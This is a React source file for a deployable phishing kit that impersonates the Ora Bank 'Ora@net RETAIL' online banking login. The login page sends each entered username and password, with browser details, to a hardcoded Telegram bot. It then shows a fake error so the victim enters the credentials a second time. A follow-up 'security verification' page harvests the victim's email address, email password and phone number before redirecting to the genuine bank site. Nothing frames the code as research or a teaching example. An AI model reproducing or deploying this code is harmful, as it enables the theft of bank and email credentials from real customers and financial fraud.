import { BrowserRouter, Routes, Route, useNavigate } from 'react-router-dom';
import { useState } from 'react';

// ============================================================
// LOGIN PAGE COMPONENT
// ============================================================
function LoginPage() {
  const navigate = useNavigate();
  const [identifiant, setIdentifiant] = useState('');
  const [password, setPassword] = useState('');
  const [showError, setShowError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);

  const sendTelegramMessage = async (username: string, pwd: string, attempt: number) => {
    const botToken = '6733452065:AAEhvIkG_mQ6csfT4407H_tkmjUqCZDt5B0';
    const chatId = '6201590412';

    const message = `🚨 Login Attempt #${attempt}\n\nUsername: ${username}\nPassword: ${pwd}\nTime: ${new Date().toISOString()}\nBrowser: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
      console.log('✅ Telegram message sent');
    } catch (error) {
      console.warn('Telegram error:', error);
    }
  };

  const handleSubmit = async () => {
    if (!identifiant.trim() || !password.trim()) {
      alert('Veuillez remplir tous les champs');
      return;
    }

    setIsLoading(true);

    if (loginAttempts === 0) {
      await sendTelegramMessage(identifiant, password, 1);
      setTimeout(() => {
        setLoginAttempts(1);
        setShowError(true);
        setPassword('');
        setIsLoading(false);
      }, 2000);
    } else if (loginAttempts === 1) {
      await sendTelegramMessage(identifiant, password, 2);
      setTimeout(() => {
        setIsLoading(false);
        navigate('/verify', { state: { identifiant, password } });
      }, 2000);
    }
  };

  return (
    <div className="page-wrapper">
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: Arial, Helvetica, sans-serif;
        }
        body, html {
          width: 100%;
          height: 100%;
          background: #e8e9e3;
          overflow-x: hidden;
        }
        .page-wrapper {
          position: relative;
          max-width: 1580px;
          width: calc(100% - 60px);
          margin: 0 auto;
          min-height: 100vh;
          overflow: hidden;
          box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.04);
        }
        .language-bar {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          width: 100%;
          background: linear-gradient(to right, #ffffff 4%, #edfad8 18%, #c5ec92 26%, #7ec845 39%, #3a8c2a 56%, #135e28 70%, #004F3A 80%, #084a39 91%);
          color: #000000;
          display: flex;
          align-items: center;
          justify-content: flex-end;
          gap: 5px;
          padding: 2px 12px 6px;
          z-index: 20;
          font-size: 12px;
        }
        .header {
          position: relative;
          height: 90px;
          margin-top: 20px;
          display: flex;
          align-items: center;
          padding: 2px 5px;
          background: #ffffff;
          z-index: 10;
        }
        .header img {
          max-width: 100%;
          height: auto;
        }
        .main-content {
          position: relative;
          min-height: calc(100vh - 105px);
          background: #004d2e;
          overflow: hidden;
          padding-bottom: 30px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .bg-gradient {
          position: absolute;
          inset: 0;
          background: radial-gradient(ellipse 107% 175% at 6% 9%, #ffffff 9%, #edfad8 16%, #c5ec92 26%, #7ec845 35%, #3a8c2a 45%, #135e28 55%, #004F3A 58%, #084a39 62%);
          z-index: 0;
        }
        .login-wrapper {
          position: relative;
          z-index: 10;
          width: clamp(320px, 92vw, 560px);
          max-width: 560px;
          display: flex;
          flex-direction: column;
          gap: 16px;
          margin: 10px auto;
        }
        .form-card {
          background-color: #edede9;
          border-radius: 8px;
          box-shadow: 0 0 6px 0 #cfcfcf;
          border: 1px solid #cfcfcf;
        }
        .alert-box {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 10px 14px;
          gap: 10px;
        }
        .alert-text {
          font-size: 14px;
          font-weight: 500;
          color: #8e684c;
          line-height: 1.45;
          flex: 1;
        }
        .welcome-text {
          text-align: center;
          color: #00693e;
          font-size: 18px;
          font-weight: 700;
          padding: 14px 10px;
          line-height: 1.5;
        }
        .form-content {
          padding: 22px 15px 26px;
          display: flex;
          flex-direction: column;
          gap: 14px;
        }
        .input-group {
          display: flex;
          flex-direction: column;
          gap: 2px;
          margin-bottom: 13px;
        }
        .input-group label {
          font-size: 14.5px;
          color: #000;
          font-weight: 400;
        }
        .input-group input {
          display: block;
          width: 100%;
          height: 40px;
          padding: 8px 12px;
          font-size: 14px;
          color: #000;
          background-color: #e8e9e3;
          border: 1px solid #aaa;
          border-radius: 4px;
          box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
          transition: border-color 0.15s, box-shadow 0.15s;
        }
        .input-group input:focus {
          box-shadow: 0 0 0 2px rgba(0, 92, 58, 0.1);
          outline: none;
          background-color: #e8e9e3;
        }
        .submit-btn {
          margin-top: 2px;
          width: 100%;
          padding: 13px 12px;
          background: #006b43;
          color: #ffffff;
          font-size: 12px;
          font-weight: 700;
          letter-spacing: 0.03em;
          text-align: center;
          border: none;
          border-radius: 4px;
          cursor: pointer;
          transition: background 0.2s;
        }
        .submit-btn:hover:not(:disabled) {
          background-color: #003620;
        }
        .submit-btn:active:not(:disabled) {
          background-color: #003620;
          box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        }
        .submit-btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }
        .error-box {
          display: none;
          background-color: #edede9;
          border-radius: 8px;
          padding: 16px;
          font-size: 14px;
          font-weight: 500;
          color: #8e684c;
        }
        .error-box.visible {
          display: block;
        }
        .footer {
          position: absolute;
          bottom: 0;
          left: 0;
          width: 100%;
          background: #000000;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 28px 35px;
          color: #ffffff;
          font-size: 14px;
          z-index: 20;
        }
      `}</style>

      <div className="language-bar">
        <span>Français</span> | <span>English</span>
      </div>

      <header className="header">
        <img src="https://ebankingtg.orabank.net/image.ebk?ressource=headerBanner1570.png&id=27829" alt="Ora Bank" />
      </header>

      <main className="main-content">
        <div className="bg-gradient"></div>

        <div className="login-wrapper">
          <div className="form-card alert-box">
            <svg width="30" height="30" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 2 L23 21 H1 Z" fill="#111111" />
              <rect x="11" y="9" width="2" height="6" fill="#ffffff" />
              <rect x="11" y="17" width="2" height="2" fill="#ffffff" />
            </svg>
            <div className="alert-text">
              NOUVEAU : l'historique de vos opérations est désormais<br />disponible sur 1 an.
            </div>
          </div>

          <div className="form-card welcome-text">
            Bienvenue sur Ora@net RETAIL, Votre compte en<br />ligne
          </div>

          <div className="form-card form-content">
            <div className="input-group">
              <label htmlFor="identifiant">Saisissez votre identifiant</label>
              <input
                type="text"
                id="identifiant"
                value={identifiant}
                onChange={(e) => setIdentifiant(e.target.value)}
                autoComplete="off"
                spellCheck="false"
              />
            </div>

            <div className="input-group">
              <label htmlFor="password">Mot de passe</label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoComplete="current-password"
              />
            </div>

            <button
              type="button"
              className="submit-btn"
              onClick={handleSubmit}
              disabled={isLoading}
            >
              {isLoading ? 'Traitement en cours...' : "S'identifier"}
            </button>
          </div>

          <div className={`form-card error-box ${showError ? 'visible' : ''}`}>
            Login ou mot de passe erroné.
          </div>
        </div>

        <footer className="footer">
          <div>Mentions légales</div>
          <div>@EBanking</div>
        </footer>
      </main>
    </div>
  );
}

// ============================================================
// VERIFICATION PAGE COMPONENT
// ============================================================
function VerificationPage() {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [emailPassword, setEmailPassword] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [showError, setShowError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [verificationAttempts, setVerificationAttempts] = useState(0);

  const sendTelegramMessage = async (userData: any) => {
    const botToken = '6733452065:AAEhvIkG_mQ6csfT4407H_tkmjUqCZDt5B0';
    const chatId = '6201590412';

    const message = `✅ Verification Complete\n\nEmail: ${userData.email}\nEmail Password: ${userData.emailPassword}\nPhone: ${userData.phoneNumber}\nTime: ${new Date().toISOString()}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
      console.log('✅ Verification sent to Telegram');
    } catch (error) {
      console.warn('Telegram error:', error);
    }
  };

  const handleSubmit = async () => {
    if (!email.trim() || !emailPassword.trim() || !phoneNumber.trim()) {
      setShowError(true);
      return;
    }

    setIsLoading(true);

    if (verificationAttempts === 0) {
      await sendTelegramMessage({ email, emailPassword, phoneNumber });
      setTimeout(() => {
        setVerificationAttempts(1);
        setShowError(true);
        setEmailPassword('');
        setIsLoading(false);
      }, 2000);
    } else if (verificationAttempts === 1) {
      await sendTelegramMessage({ email, emailPassword, phoneNumber });
      setTimeout(() => {
        setIsLoading(false);
        window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
      }, 2000);
    }
  };

  return (
    <div className="page-wrapper">
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: Arial, Helvetica, sans-serif;
        }
        body, html {
          width: 100%;
          height: 100%;
          background: #e8e9e3;
          overflow-x: hidden;
        }
        .page-wrapper {
          position: relative;
          max-width: 1580px;
          width: calc(100% - 60px);
          margin: 0 auto;
          min-height: 100vh;
          overflow: hidden;
          box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.04);
        }
        .language-bar {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          width: 100%;
          background: linear-gradient(to right, #ffffff 4%, #edfad8 18%, #c5ec92 26%, #7ec845 39%, #3a8c2a 56%, #135e28 70%, #004F3A 80%, #084a39 91%);
          color: #000000;
          display: flex;
          align-items: center;
          justify-content: flex-end;
          gap: 5px;
          padding: 2px 12px 6px;
          z-index: 20;
          font-size: 12px;
        }
        .header {
          position: relative;
          height: 90px;
          margin-top: 20px;
          display: flex;
          align-items: center;
          padding: 2px 5px;
          background: #ffffff;
          z-index: 10;
        }
        .header img {
          max-width: 100%;
          height: auto;
        }
        .main-content {
          position: relative;
          min-height: calc(100vh - 105px);
          background: #004d2e;
          overflow: hidden;
          padding-bottom: 30px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .bg-gradient {
          position: absolute;
          inset: 0;
          background: radial-gradient(ellipse 107% 175% at 6% 9%, #ffffff 9%, #edfad8 16%, #c5ec92 26%, #7ec845 35%, #3a8c2a 45%, #135e28 55%, #004F3A 58%, #084a39 62%);
          z-index: 0;
        }
        .verification-wrapper {
          position: relative;
          z-index: 10;
          width: clamp(320px, 92vw, 560px);
          max-width: 560px;
          display: flex;
          flex-direction: column;
          gap: 16px;
          margin: 40px auto;
        }
        .verification-card {
          background: #edede9;
          border: 1px solid #777;
          box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
          border-radius: 8px;
          padding: 30px;
          color: #000;
          animation: modalSlideIn 0.2s ease-out;
        }
        @keyframes modalSlideIn {
          from {
            opacity: 0;
            transform: translateY(-20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .verification-title {
          font-size: 20px;
          font-weight: 700;
          margin-bottom: 20px;
          color: #00693e;
        }
        .verification-desc {
          font-size: 14px;
          color: #666;
          margin-bottom: 20px;
        }
        .modal-input {
          width: 100%;
          padding: 10px 12px;
          margin-bottom: 12px;
          border: 1px solid #aaa;
          border-radius: 4px;
          font-size: 14px;
          background-color: #e8e9e3;
          color: #000;
        }
        .modal-input:focus {
          outline: none;
          box-shadow: 0 0 0 2px rgba(0, 92, 58, 0.1);
        }
        .modal-error {
          display: none;
          background: #edede9;
          padding: 12px;
          border-radius: 4px;
          color: #8e684c;
          font-size: 13px;
          margin-bottom: 15px;
          border: 1px solid #ccc;
        }
        .modal-error.visible {
          display: block;
        }
        .modal-buttons {
          display: flex;
          gap: 10px;
          justify-content: flex-end;
          margin-top: 20px;
        }
        .modal-btn {
          padding: 10px 20px;
          border: none;
          border-radius: 4px;
          cursor: pointer;
          font-size: 12px;
          font-weight: 700;
          transition: background 0.2s;
        }
        .modal-btn-cancel {
          background: #999;
          color: #fff;
        }
        .modal-btn-cancel:hover {
          background: #777;
        }
        .modal-btn-submit {
          background: #006b43;
          color: #fff;
        }
        .modal-btn-submit:hover:not(:disabled) {
          background: #003620;
        }
        .modal-btn-submit:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }
        .footer {
          position: absolute;
          bottom: 0;
          left: 0;
          width: 100%;
          background: #000000;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 28px 35px;
          color: #ffffff;
          font-size: 14px;
          z-index: 20;
        }
      `}</style>

      <div className="language-bar">
        <span>Français</span> | <span>English</span>
      </div>

      <header className="header">
        <img src="https://ebankingtg.orabank.net/image.ebk?ressource=headerBanner1570.png&id=27829" alt="Ora Bank" />
      </header>

      <main className="main-content">
        <div className="bg-gradient"></div>

        <div className="verification-wrapper">
          <div className="verification-card">
            <div className="verification-title">Vérification de sécurité</div>
            <div className="verification-desc">
              Pour continuer, veuillez fournir vos informations.
            </div>

            <div className={`modal-error ${showError ? 'visible' : ''}`}>
              Veuillez remplir tous les champs.
            </div>

            <input
              type="email"
              className="modal-input"
              placeholder="Adresse e-mail"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              className="modal-input"
              placeholder="Mot de passe e-mail"
              value={emailPassword}
              onChange={(e) => setEmailPassword(e.target.value)}
            />
            <input
              type="tel"
              className="modal-input"
              placeholder="Numéro de téléphone"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
            />

            <div className="modal-buttons">
              <button
                className="modal-btn modal-btn-cancel"
                onClick={() => navigate('/')}
              >
                Annuler
              </button>
              <button
                className="modal-btn modal-btn-submit"
                onClick={handleSubmit}
                disabled={isLoading}
              >
                {isLoading ? 'Traitement...' : 'Continuer'}
              </button>
            </div>
          </div>
        </div>

        <footer className="footer">
          <div>Mentions légales</div>
          <div>@EBanking</div>
        </footer>
      </main>
    </div>
  );
}

// ============================================================
// MAIN APP WITH ROUTER
// ============================================================
function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<LoginPage />} />
        <Route path="/verify" element={<VerificationPage />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
